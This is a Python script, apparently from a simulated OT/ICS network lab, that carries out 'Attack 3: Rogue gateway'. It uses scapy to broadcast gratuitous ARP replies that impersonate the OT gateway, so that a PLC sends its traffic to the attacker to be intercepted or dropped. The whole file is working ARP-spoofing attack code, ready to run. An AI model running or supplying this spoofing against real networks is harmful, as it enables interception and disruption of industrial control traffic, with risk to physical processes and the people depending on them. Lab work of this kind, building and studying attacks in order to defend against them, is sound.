#!/usr/bin/env python3
"""
rogue_gateway.py — Attack 3: Rogue gateway.

Run from ot_hmi (the "compromised" OT host) to broadcast gratuitous ARP
claiming ownership of the real OT gateway IP (branch_rtr's otlink,
10.10.2.1). Any OT host that accepts the announcement (e.g. ot_plc) will
start sending its "gateway-bound" traffic (including anything destined
for HQ/IT) to the attacker instead of the real router — letting the
attacker intercept or drop traffic from a PLC.

Run as:  ip netns exec ot_hmi python3 attacks/rogue_gateway.py \
             --gateway-ip 10.10.2.1 --duration 20
"""
import argparse
import time
from scapy.all import ARP, Ether, sendp, get_if_hwaddr


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--gateway-ip", default="10.10.2.1",
                     help="real OT gateway IP being impersonated")
    ap.add_argument("--iface", default="ot0")
    ap.add_argument("--duration", type=int, default=20)
    ap.add_argument("--interval", type=float, default=1.0)
    args = ap.parse_args()

    attacker_mac = get_if_hwaddr(args.iface)
    print(f"[rogue_gateway] Attacker MAC: {attacker_mac}")
    print(f"[rogue_gateway] Broadcasting gratuitous ARP: "
          f"\"{args.gateway_ip} is at {attacker_mac}\" for {args.duration}s...")

    # Gratuitous ARP: psrc == pdst == the IP being claimed, broadcast dest.
    pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,
        psrc=args.gateway_ip,
        hwsrc=attacker_mac,
        pdst=args.gateway_ip,
    )

    end = time.time() + args.duration
    sent = 0
    while time.time() < end:
        sendp(pkt, iface=args.iface, verbose=0)
        sent += 1
        time.sleep(args.interval)

    print(f"[rogue_gateway] Done. Sent {sent} gratuitous ARP announcements.")


if __name__ == "__main__":
    main()
